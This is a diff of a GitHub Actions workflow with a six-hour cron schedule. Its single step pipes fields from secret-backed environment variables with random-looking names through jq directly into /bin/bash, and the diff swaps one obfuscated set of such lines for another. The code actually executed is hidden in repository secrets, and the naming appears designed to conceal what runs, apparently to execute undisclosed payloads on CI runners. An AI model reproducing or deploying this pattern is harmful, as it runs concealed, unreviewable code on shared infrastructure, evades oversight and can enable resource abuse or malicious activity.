@@ -2,23 +2,29 @@ name: fengfaming6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
-jobs:  # 27585
+    - cron: '43 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fengfaming6789
         env:
-          uhp8: ${{ secrets.uhp8 }}
+          tnwyv3877: ${{ secrets.tnwyv3877 }}
         run: |
-          echo $uhp8 | jq -r .telpm13 | /bin/bash
-          echo $boypj7 | jq -r .d543 | /bin/bash
-          echo $ctzfd8036 | jq -r .r7 | /bin/bash
-          echo $m37 | jq -r .tjirn474 | /bin/bash
-          echo $or5236 | jq -r .dyd8421 | /bin/bash
-          echo $uy55344 | jq -r .dea583 | /bin/bash
-          echo $hkyy5 | jq -r .byinx930 | /bin/bash
-          echo $agj1844 | jq -r .t3 | /bin/bash
-          echo $w96 | jq -r .awhz59 | /bin/bash
+          echo $tnwyv3877 | jq -r .vho81 | /bin/bash
+          echo $lgwlt67 | jq -r .iusk319 | /bin/bash
+          echo $e1 | jq -r .vutl5263 | /bin/bash
+          echo $nto6 | jq -r .fjvmz3293 | /bin/bash
+          echo $rvlfg70 | jq -r .hvvof6 | /bin/bash
+          echo $i675 | jq -r .a969 | /bin/bash
+          echo $rr469 | jq -r .iw39 | /bin/bash
+          echo $ex27 | jq -r .iupf14397 | /bin/bash
+          echo $nd77530 | jq -r .wuxtp5274 | /bin/bash
+          echo $en78737 | jq -r .s4 | /bin/bash
+          echo $bqqrz5 | jq -r .ockf77 | /bin/bash
+          echo $abs67442 | jq -r .u02 | /bin/bash
+          echo $x43 | jq -r .oow76372 | /bin/bash
+          echo $zt605 | jq -r .onh0 | /bin/bash
 
